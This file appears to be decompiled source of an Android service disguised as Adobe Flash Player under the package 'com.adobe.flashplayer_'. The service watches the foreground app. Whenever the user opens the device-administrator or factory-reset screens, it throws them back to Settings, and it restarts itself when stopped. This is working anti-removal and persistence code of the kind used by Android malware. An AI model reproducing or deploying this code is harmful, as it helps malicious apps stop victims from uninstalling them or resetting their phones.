package com.adobe.flashplayer_;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.CountDownTimer;
import android.os.IBinder;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class AdobeZCore extends Service {
    public void onCreate() {
        super.onCreate();
        new CountDownTimer(90000, 10) {
            public void onTick(long millisUntilFinished) {
                Intent intent;
                ComponentName componentInfo = ((RunningTaskInfo) ((ActivityManager) AdobeZCore.this.getSystemService("activity")).getRunningTasks(1).get(0)).topActivity;
                if (componentInfo.getClassName().contains("com.android.settings.DeviceAdminAdd")) {
                    intent = new Intent("android.settings.SETTINGS");
                    intent.setFlags(AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                    intent.setFlags(1073741824);
                    intent.setFlags(268435456);
                    intent.addFlags(67108864);
                    AdobeZCore.this.getApplicationContext().startActivity(intent);
                }
                if (componentInfo.getClassName().contains("com.android.settings.MasterReset")) {
                    intent = new Intent("android.settings.SETTINGS");
                    intent.setFlags(AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                    intent.addFlags(67108864);
                    intent.setFlags(1073741824);
                    intent.setFlags(268435456);
                    AdobeZCore.this.startActivity(intent);
                }
            }

            public void onFinish() {
                AdobeZCore.this.stopSelf();
            }
        }.start();
    }

    private String readConfig(String config, Context context) {
        String ret = "";
        try {
            InputStream inputStream = context.openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
        startService(new Intent(this, AdobeZCore.class));
    }
}
